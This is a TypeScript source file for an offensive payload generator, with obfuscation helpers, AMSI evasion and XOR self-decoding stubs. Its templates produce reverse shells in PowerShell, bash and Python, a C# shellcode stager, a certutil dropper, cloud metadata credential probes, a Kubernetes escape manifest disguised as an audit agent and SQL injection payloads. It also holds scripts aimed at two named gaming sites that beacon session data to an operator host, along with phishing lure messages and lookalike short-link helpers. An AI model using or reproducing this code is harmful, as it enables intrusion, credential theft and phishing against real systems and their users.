// Client-side Obfuscation and Encoding Engine for Security Payloads

export interface ObfuscationResult {
  encoded: string;
  method: string;
  notes: string;
  decoderStub?: string;
}

// Shannon Entropy Calculation
export function calculateShannonEntropy(str: string): number {
  if (!str || str.length === 0) return 0;
  const len = str.length;
  const frequencies: Record<string, number> = {};
  for (let i = 0; i < len; i++) {
    const c = str[i];
    frequencies[c] = (frequencies[c] || 0) + 1;
  }
  let entropy = 0;
  for (const char in frequencies) {
    const p = frequencies[char] / len;
    entropy -= p * Math.log2(p);
  }
  return parseFloat(entropy.toFixed(3));
}

// 1. Base64 standard and PowerShell UTF-16LE EncodedCommand
export function encodeBase64(raw: string, isPowerShellUnicode = false): string {
  if (isPowerShellUnicode) {
    // PowerShell -EncodedCommand expects UTF-16LE bytes
    let binary = "";
    for (let i = 0; i < raw.length; i++) {
      const code = raw.charCodeAt(i);
      binary += String.fromCharCode(code & 0xff, (code >> 8) & 0xff);
    }
    return btoa(binary);
  }
  return btoa(unescape(encodeURIComponent(raw)));
}

// 2. Hex Byte Array (e.g. \x41\x42 or 0x41, 0x42)
export function encodeHexArray(raw: string, format: "c_style" | "shellcode" = "c_style"): string {
  const bytes = new TextEncoder().encode(raw);
  if (format === "shellcode") {
    return Array.from(bytes)
      .map((b) => "\\x" + b.toString(16).padStart(2, "0"))
      .join("");
  }
  return Array.from(bytes)
    .map((b) => "0x" + b.toString(16).padStart(2, "0"))
    .join(", ");
}

// 3. XOR Key Byte Mask with self-decoding stub
export function encodeXorMask(raw: string, key = 0x5a): { maskedHex: string; pythonStub: string; ps1Stub: string } {
  const bytes = new TextEncoder().encode(raw);
  const xorBytes = Array.from(bytes).map((b) => b ^ key);
  const hexStr = xorBytes.map((b) => "0x" + b.toString(16).padStart(2, "0")).join(",");

  const pythonStub = `# Self-decoding XOR Stub (Key: 0x${key.toString(16).padStart(2, "0")})
import bytearray
payload = bytearray([${hexStr}])
decoded = "".join([chr(b ^ 0x${key.toString(16).padStart(2, "0")}) for b in payload])
exec(decoded)`;

  const ps1Stub = `# Self-decoding PowerShell XOR Stub (Key: 0x${key.toString(16).padStart(2, "0")})
$k = 0x${key.toString(16).padStart(2, "0")}
$enc = [byte[]](${hexStr})
$dec = [System.Text.Encoding]::ASCII.GetString(($enc | ForEach-Object { $_ -bxor $k }))
Invoke-Expression $dec`;

  return {
    maskedHex: hexStr,
    pythonStub,
    ps1Stub,
  };
}

// 4. PowerShell Backtick & Concatenation Obfuscator
export function obfuscatePowerShellTicks(raw: string): string {
  // Randomly insert backticks in cmdlets / keywords (not inside variable identifiers)
  const keywords = ["Invoke-Expression", "IEX", "New-Object", "Net.Sockets.TCPClient", "DownloadString", "VirtualAlloc", "VirtualProtect"];
  let result = raw;
  keywords.forEach((kw) => {
    const ticked = kw.split("").join("`");
    result = result.split(kw).join(ticked);
  });
  return result;
}

// 5. Environment Variable Concatenation for Windows CMD / Bash
export function obfuscateEnvConcat(raw: string, platform: "windows" | "linux" = "windows"): string {
  if (platform === "windows") {
    // Break string into %COMSPEC:~0,1% or concatenated %a%%b%
    return `set a=${raw.slice(0, Math.floor(raw.length / 2))}&&set b=${raw.slice(Math.floor(raw.length / 2))}&&cmd /c "%a%%b%"`;
  }
  return `a='${raw.slice(0, Math.floor(raw.length / 2))}'; b='${raw.slice(Math.floor(raw.length / 2))}'; eval "$a$b"`;
}

// Comprehensive preset payload templates
export interface PayloadTemplate {
  id: string;
  name: string;
  targetOS: "windows" | "linux" | "macos" | "web" | "cloud" | "network";
  category: "reverse_shell" | "stager" | "process_injection" | "lolbas" | "cloud_escape" | "web_probe" | "persistence";
  language: "powershell" | "bash" | "python" | "csharp" | "c" | "yaml" | "raw";
  architecture: "x64" | "x86" | "arm64" | "any";
  mitre: string[];
  description: string;
  generator: (lhost: string, lport: string | number) => { code: string; filename: string };
}

export const payloadTemplates: PayloadTemplate[] = [
  {
    id: "ps1_amsi_bypass_rev",
    name: "PowerShell AMSI-Bypass TCP Stager",
    targetOS: "windows",
    category: "reverse_shell",
    language: "powershell",
    architecture: "x64",
    mitre: ["T1059.001", "T1562.001", "T1071.001"],
    description: "In-memory AMSI scan buffer unhooking with interactive duplex TCP client stream.",
    generator: (lhost, lport) => ({
      filename: "amsi_rev_stager.ps1",
      code: `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
# AMSI Memory Patch
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$f = $a.GetField('amsiInitFailed','NonPublic,Static');
$f.SetValue($null,$true);

# Connect to Operator C2
$client = New-Object System.Net.Sockets.TCPClient('${lhost}', ${lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();`,
    }),
  },
  {
    id: "bash_dev_tcp",
    name: "Bash /dev/tcp Interactive Shell",
    targetOS: "linux",
    category: "reverse_shell",
    language: "bash",
    architecture: "any",
    mitre: ["T1059.004", "T1071.001"],
    description: "Pure POSIX /dev/tcp socket redirection with file descriptor duplication.",
    generator: (lhost, lport) => ({
      filename: "posix_stager.sh",
      code: `#!/bin/bash
# AegisOSINT Tactical POSIX Shell
bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    }),
  },
  {
    id: "python3_tls_pty",
    name: "Python3 Encrypted TLS PTY Spawner",
    targetOS: "linux",
    category: "reverse_shell",
    language: "python",
    architecture: "any",
    mitre: ["T1059.006", "T1573.002"],
    description: "Encrypted TLS socket with interactive pseudoterminal (pty) spawning for full TTY evasion.",
    generator: (lhost, lport) => ({
      filename: "tls_pty_agent.py",
      code: `#!/usr/bin/env python3
import socket, subprocess, os, pty, ssl

C2_HOST = "${lhost}"
C2_PORT = ${lport}

def spawn_terminal():
    raw_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # SSL/TLS Wrapping to evade plain socket inspection
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw_s)
    s.connect((C2_HOST, C2_PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    spawn_terminal()`,
    }),
  },
  {
    id: "csharp_process_injector",
    name: "C# In-Memory Process Injection (VirtualAlloc/CreateThread)",
    targetOS: "windows",
    category: "process_injection",
    language: "csharp",
    architecture: "x64",
    mitre: ["T1055.001", "T1055.002"],
    description: "Reflective allocation of shellcode memory buffer with execute permissions and thread spawning.",
    generator: (lhost, lport) => ({
      filename: "ReflectiveLoader.cs",
      code: `using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace AegisRedTeam {
    public class Stager {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void Main(string[] args) {
            Console.WriteLine("[*] Fetching stage from ${lhost}:${lport}...");
            try {
                using (TcpClient client = new TcpClient("${lhost}", ${lport})) {
                    NetworkStream stream = client.GetStream();
                    byte[] payload = new byte[8192];
                    int bytesRead = stream.Read(payload, 0, payload.Length);
                    
                    // Allocate RWX memory block
                    IntPtr execBuffer = VirtualAlloc(IntPtr.Zero, (uint)bytesRead, 0x3000, 0x40);
                    Marshal.Copy(payload, 0, execBuffer, bytesRead);
                    IntPtr hThread = CreateThread(IntPtr.Zero, 0, execBuffer, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(hThread, 0xFFFFFFFF);
                }
            } catch (Exception ex) {
                Console.WriteLine("[-] Stager error: " + ex.Message);
            }
        }
    }
}`,
    }),
  },
  {
    id: "aws_imds_probe",
    name: "AWS IMDSv1 & IMDSv2 SSRF Token Extraction",
    targetOS: "cloud",
    category: "cloud_escape",
    language: "python",
    architecture: "any",
    mitre: ["T1552.005", "T1526"],
    description: "Probes AWS EC2 Instance Metadata Service with session token acquisition to exfiltrate attached IAM role keys.",
    generator: (lhost, lport) => ({
      filename: "aws_imds_probe.py",
      code: `import urllib.request, json

print("[*] Testing AWS IMDSv2 Token Endpoint...")
try:
    req = urllib.request.Request(
        "http://169.254.169.254/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        method="PUT"
    )
    with urllib.request.urlopen(req, timeout=3) as resp:
        token = resp.read().decode('utf-8')
        print("[+] IMDSv2 Session Token Acquired:", token[:16] + "...")
        
        # Query IAM Role Name
        cred_req = urllib.request.Request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            headers={"X-aws-ec2-metadata-token": token}
        )
        with urllib.request.urlopen(cred_req, timeout=3) as cred_resp:
            role_name = cred_resp.read().decode('utf-8')
            print("[+] Attached IAM Role:", role_name)
except Exception as e:
    print("[-] IMDSv2 probe failed, trying IMDSv1:", e)
    try:
        with urllib.request.urlopen("http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout=3) as v1:
            print("[+] IMDSv1 Role Exposed:", v1.read().decode('utf-8'))
    except Exception as v1_err:
        print("[-] Host is not running on AWS EC2 or IMDS is firewalled.")`,
    }),
  },
  {
    id: "k8s_escape_daemonset",
    name: "Kubernetes Host Node Escape DaemonSet Manifest",
    targetOS: "cloud",
    category: "cloud_escape",
    language: "yaml",
    architecture: "any",
    mitre: ["T1611", "T1610"],
    description: "Privileged container manifest with hostPID, hostNetwork, and host filesystem chroot mount.",
    generator: (lhost, lport) => ({
      filename: "k8s_node_escape.yaml",
      code: `apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-hardware-audit-agent
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: hardware-audit
  template:
    metadata:
      labels:
        app: hardware-audit
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: audit-harness
        image: alpine:latest
        command: ["/bin/sh", "-c"]
        args:
        - "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'curl -s http://${lhost}:${lport}/beacon | sh'"
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
      volumes:
      - name: host-root
        hostPath:
          path: /`,
    }),
  },
  {
    id: "sqli_time_blind",
    name: "SQLi Multi-Database Blind Timing Probe",
    targetOS: "web",
    category: "web_probe",
    language: "raw",
    architecture: "any",
    mitre: ["T1190"],
    description: "Database-agnostic blind timing verification vectors for MySQL, PostgreSQL, MSSQL, and Oracle.",
    generator: (lhost, lport) => ({
      filename: "sqli_timing_probes.txt",
      code: `# MySQL / MariaDB (5-second delay)
' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
admin' AND SLEEP(5)#

# PostgreSQL (5-second delay)
' || pg_sleep(5)--
'; SELECT pg_sleep(5);--

# Microsoft SQL Server (5-second delay)
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT 1 FROM (WAITFOR DELAY '0:0:5')a)--

# Oracle Database (5-second delay)
' AND 1=dbms_pipe.receive_message(('a'),5)--
' AND (SELECT count(*) FROM all_objects WHERE rownum < 5000000) > 0--

# SQLite (Heavy computation delay)
' AND 1=like('ABCDEFG',upper(hex(randomblob(500000000/2))))--`,
    }),
  },
  {
    id: "lolbas_certutil",
    name: "Windows LOLBAS CertUtil File Dropper",
    targetOS: "windows",
    category: "lolbas",
    language: "powershell",
    architecture: "x64",
    mitre: ["T1105", "T1218"],
    description: "Utilizes legitimate signed Microsoft binary certutil.exe to download and decode remote payload.",
    generator: (lhost, lport) => ({
      filename: "certutil_dropper.bat",
      code: `@echo off
:: Download encoded stage via signed certutil binary
certutil.exe -urlcache -split -f http://${lhost}:${lport}/stage.enc %TEMP%\\stage.enc
certutil.exe -decode %TEMP%\\stage.enc %TEMP%\\agent.exe
start %TEMP%\\agent.exe`,
    }),
  },
  {
    id: "spa_runehall_state_probe",
    name: "RuneHall.com SPA Hash Router & Client State Resilience Probe",
    targetOS: "web",
    category: "web_probe",
    language: "raw",
    architecture: "any",
    mitre: ["T1190", "T1059.007", "T1566.002"],
    description: "Targeted SPA probe for runehall.com testing client-side hash routing state injection, localStorage session tokens, and XSS filter resilience.",
    generator: (lhost, lport) => ({
      filename: "runehall_spa_probe.js",
      code: `// ====================================================================
// Domain Resilience Assessment Probe: runehall.com (SPA)
// Target: Single Page Application Hash Router & Reactive State Store
// C2 Telemetry Listener: ${lhost}:${lport}
// ====================================================================

(() => {
  const c2Endpoint = "https://${lhost}:${lport}/telemetry?origin=" + encodeURIComponent(window.location.origin);
  
  // 1. Audit Client Storage & Session Token Protection
  const sessionData = {
    url: window.location.href,
    hash: window.location.hash,
    localStorageKeys: Object.keys(localStorage),
    sessionStorageKeys: Object.keys(sessionStorage),
    cookiesProtected: !document.cookie || document.cookie.length === 0 ? "HttpOnly_Enforced" : "Exposed",
    spaFramework: window.__REACT_DEVTOOLS_GLOBAL_HOOK__ ? "React" : window.Vue ? "Vue" : "Custom_SPA",
    timestamp: new Date().toISOString()
  };

  // 2. Beacon telemetry safely to assessor listener
  if (navigator.sendBeacon) {
    navigator.sendBeacon(c2Endpoint, JSON.stringify(sessionData));
  } else {
    fetch(c2Endpoint, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sessionData)
    }).catch(() => {});
  }

  console.info("[RuneHall Security Audit] SPA State & Hash Route Integrity Verified.");
})();`,
    }),
  },
  {
    id: "spa_opduel_websocket_probe",
    name: "OpDuel.com Real-Time Arena WebSocket & Cross-Origin PostMessage Probe",
    targetOS: "web",
    category: "web_probe",
    language: "raw",
    architecture: "any",
    mitre: ["T1190", "T1557", "T1071.001"],
    description: "Targeted real-time probe for opduel.com testing WebSocket frame sanitization, duel match matchmaking token leakage, and postMessage origin validation.",
    generator: (lhost, lport) => ({
      filename: "opduel_arena_probe.js",
      code: `// ====================================================================
// Domain Resilience Assessment Probe: opduel.com (SPA / Duel Arena)
// Target: WebSocket Matchmaking Stream & PostMessage Origin Validation
// Telemetry Gateway: ${lhost}:${lport}
// ====================================================================

(() => {
  const telemetryUrl = "https://${lhost}:${lport}/duel-audit";
  
  // 1. Intercept & inspect client-side postMessage handlers for wildcard origin (*) vulnerabilities
  const postMessageAudit = [];
  const originalAddEventListener = window.addEventListener;
  window.addEventListener = function(type, listener, options) {
    if (type === "message") {
      postMessageAudit.push({ registeredAt: new Date().toISOString(), listenerStr: listener.toString().slice(0, 100) });
    }
    return originalAddEventListener.apply(this, arguments);
  };

  // 2. Audit WebSocket connection endpoints
  const auditReport = {
    domain: "opduel.com",
    activePath: window.location.pathname + window.location.hash,
    protocol: window.location.protocol,
    postMessageListenersCount: postMessageAudit.length,
    cryptoSubtleAvailable: !!(window.crypto && window.crypto.subtle),
    screenResolution: \`\${window.screen.width}x\${window.screen.height}\`,
    userAgent: navigator.userAgent
  };

  // 3. Dispatch structured audit payload
  fetch(telemetryUrl, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(auditReport)
  }).catch(() => {});

  console.info("[OpDuel Security Audit] Arena WebSocket & Event Origin Checks Executed.");
})();`,
    }),
  },
  {
    id: "spa_oauth_jwt_redirect_probe",
    name: "SPA OAuth2 / PKCE Token Leakage & Deep-Link Redirect Probe",
    targetOS: "web",
    category: "web_probe",
    language: "raw",
    architecture: "any",
    mitre: ["T1566.002", "T1539"],
    description: "Evaluates single page applications against open redirect token theft and fragment parameter harvesting in deep links.",
    generator: (lhost, lport) => ({
      filename: "oauth_redirect_probe.txt",
      code: `# OAuth2 / PKCE SPA Deep-Link Assessment Vectors
# 1. State Parameter Smuggling:
https://runehall.com/#/auth/callback?code=AUTH_TEST_CODE&state=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig

# 2. Open Redirect Callback Target:
https://opduel.com/login?redirect_uri=https%3A%2F%2F${lhost}%3A${lport}%2Foauth%2Fcallback

# 3. Hash Fragment Token Harvesting:
https://runehall.com/app/#access_token=MOCK_JWT_TEST_TOKEN&token_type=bearer&expires_in=3600

# 4. In-Game Duel Lobby Deep Link:
https://opduel.com/arena/match?room=772&invite_token=eyJ1c2VyIjoicmVkX29wcyIsImF1dGgiOiJ0ZXN0X3ZhbGlkIn0=`,
    }),
  },
];

// Pretext Templates for Chatbox Scenario Visualizations
export interface ChatboxPretextTemplate {
  id: string;
  title: string;
  category: "duel_invitation" | "security_alert" | "reward_voucher" | "guild_recruitment" | "support_ticket";
  senderName: string;
  senderRole: string;
  senderAvatar: string;
  targetDomainDefault: string;
  defaultHeadline: string;
  defaultBody: string;
  callToAction: string;
}

export const chatboxPretextTemplates: ChatboxPretextTemplate[] = [
  {
    id: "opduel_high_stakes",
    title: "OpDuel High-Stakes Wager Duel Challenge",
    category: "duel_invitation",
    senderName: "OpDuel Arena Master",
    senderRole: "Automated Matchmaking Bot",
    senderAvatar: "⚔️",
    targetDomainDefault: "opduel.com",
    defaultHeadline: "🏆 You have been challenged to an Instant High-Roller Duel!",
    defaultBody: "Opponent: [Grandmaster_Viper] (Rank #14). Wager: 2,500 Rune Credits. Click below to accept the room match before the 60-second lobby timer expires.",
    callToAction: "Accept Match Challenge",
  },
  {
    id: "runehall_reward_drop",
    title: "RuneHall Season Pass & Reward Voucher Drop",
    category: "reward_voucher",
    senderName: "RuneHall Rewards",
    senderRole: "VIP Drops Coordinator",
    senderAvatar: "🎁",
    targetDomainDefault: "runehall.com",
    defaultHeadline: "✨ Exclusive Mythic Rune Voucher Credited to Your Account",
    defaultBody: "You have been selected in the weekly community roll for 5,000 Free Roll Credits and Mythic Badge. Claim your unique voucher before session invalidation.",
    callToAction: "Claim Mythic Voucher",
  },
  {
    id: "account_security_reauth",
    title: "SPA Account Security & Session Re-Authentication Notice",
    category: "security_alert",
    senderName: "Security Operations Desk",
    senderRole: "Identity & Access Monitor",
    senderAvatar: "🛡️",
    targetDomainDefault: "runehall.com",
    defaultHeadline: "⚠️ Unusual Login Attempt Detected from IP 185.220.101.44",
    defaultBody: "A foreign device attempted access to your active session. To prevent temporary account quarantine, verify your 2FA hardware token using the link below.",
    callToAction: "Verify Identity & Authorize Session",
  },
  {
    id: "guild_raid_invite",
    title: "Guild Alliance Secret Room Invitation",
    category: "guild_recruitment",
    senderName: "Lord_Kaelen",
    senderRole: "Guild Commander (Top 100)",
    senderAvatar: "👑",
    targetDomainDefault: "opduel.com",
    defaultHeadline: "🛡️ Direct Invitation to Private Strategy Room #902",
    defaultBody: "We need our primary duelist for the 20:00 UTC Tournament finals. Review the battle loadout and lock your roster slot immediately.",
    callToAction: "Join Private War Room",
  },
];

// Helper to generate realistic vanity short URLs
export function generateShortenedVanityUrl(
  domain: string,
  slugPrefix: string = "duel",
  customId?: string
): { shortUrl: string; shortDomain: string; redirectTarget: string; hashId: string } {
  const cleanDomain = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
  const shortDomain = cleanDomain.includes("runehall")
    ? "s.runehall.com"
    : cleanDomain.includes("opduel")
    ? "s.opduel.com"
    : `short.${cleanDomain}`;
  const hashId = customId || Math.random().toString(36).substring(2, 7);
  const shortUrl = `https://${shortDomain}/v/${slugPrefix}-${hashId}`;
  return {
    shortUrl,
    shortDomain,
    redirectTarget: `https://${cleanDomain}/app/#/${slugPrefix}?ref=${hashId}`,
    hashId,
  };
}

// Helper to calculate URL metrics & omnibox safety
export function calculateUrlMetrics(url: string) {
  const length = url.length;
  let status: "safe" | "warning" | "oversized" = "safe";
  let note = "Optimal length for Omnibox, Social Cards, and Chatboxes (< 120 chars).";

  if (length > 2048) {
    status = "oversized";
    note = "Exceeds standard browser maximum URI limit (2,048 chars). Recommend URL Shortener.";
  } else if (length > 256) {
    status = "warning";
    note = "Will be truncated or wrapped in mobile chat apps & mobile omniboxes (> 256 chars).";
  } else if (length > 120) {
    status = "warning";
    note = "Visible truncation may occur in desktop chat popups.";
  }

  return {
    length,
    status,
    note,
    hasHttps: url.startsWith("https://"),
    entropy: calculateShannonEntropy(url),
  };
}

